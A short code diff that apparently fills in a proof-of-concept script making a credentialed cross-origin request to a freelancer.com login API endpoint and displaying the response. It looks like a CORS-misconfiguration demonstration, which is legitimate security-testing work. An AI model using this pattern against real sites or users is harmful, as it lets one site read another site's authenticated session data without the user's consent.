@@ -6,7 +6,7 @@ xhttp.onreadystatechange = function(){
         alert(xhttp.responseText);
     }
 };
-xhttp.open("GET","",true);
+xhttp.open("GET","https://www.freelancer.com/ajax-api/auth/login.php?compact=true&new_errors=true&new_pools=tru",true);
 xhttp.withCredentials=true;
 xhttp.send();
 </script>
